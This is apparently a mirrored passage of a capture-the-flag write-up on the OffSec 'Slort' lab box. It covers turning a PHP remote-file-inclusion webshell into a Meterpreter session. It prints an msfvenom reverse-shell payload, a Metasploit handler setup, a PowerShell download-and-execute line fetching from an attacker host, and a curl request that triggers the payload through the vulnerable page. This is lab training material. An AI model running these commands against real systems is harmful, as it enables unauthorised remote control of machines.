# :globe_with_meridians: Metasploit handler

> **Original Source:** [Metasploit handler](https://infosecwriteups.com/slort-rfi-via-php-allow-url-include-writable-scheduled-task-binary-to-administrator-offsec-pg-ac72c40761ae)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## 3.3 Upgrading to an Interactive Meterpreter Session


A webshell requires a separate HTTP request for every command and leaves a log entry for every action. An interactive reverse shell provides a persistent, stateful terminal session.


Generate a stageless Windows Meterpreter payload:


```
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=4444 \
-f exe -o shell.exe
```


A stageless payload (`meterpreter_reverse_tcp`) embeds the full Meterpreter agent in a single executable. A staged payload (`meterpreter/reverse_tcp`) sends a small stager first, which then downloads the agent in a second connection. Stageless is more reliable — one connection, full functionality from the moment it lands. If the second connection of a staged payload is interrupted by a firewall or timing issue, the session is lost.


## Get Roshan Rajbanshi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Serve the payload and set up the Metasploit handler:


```
# Metasploit handler
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
run
```


Deliver the payload via the webshell using a base64-encoded PowerShell command. Base64 encoding the entire PowerShell command with `-enc` sidesteps character escaping issues that arise when special characters — quotes, semicolons, dollar signs, pipes — must survive intact through URL encoding, PHP's `system()`, and PowerShell's own parser. A single base64 token collapses all of that complexity.


```
# Generate the base64-encoded download-and-execute command
powershell -c "IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/shell.exe'))"
# Base64-encode the above in UTF-16LE for PowerShell -enc
```


Trigger via the webshell:


```
curl "http://<TARGET_IP>:8080/site/index.php?page=http://<ATTACKER_IP>:8000/cmd.php&cmd=powershell+-enc+<BASE64_PAYLOAD>"
```


Meterpreter session received:


```
meterpreter > getuid
Server username: SLORT\rupert
```


Interactive session as `rupert`. Standard post-exploitation enumeration follows.

---

*Originally published on [Medium](https://infosecwriteups.com/slort-rfi-via-php-allow-url-include-writable-scheduled-task-binary-to-administrator-offsec-pg-ac72c40761ae). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
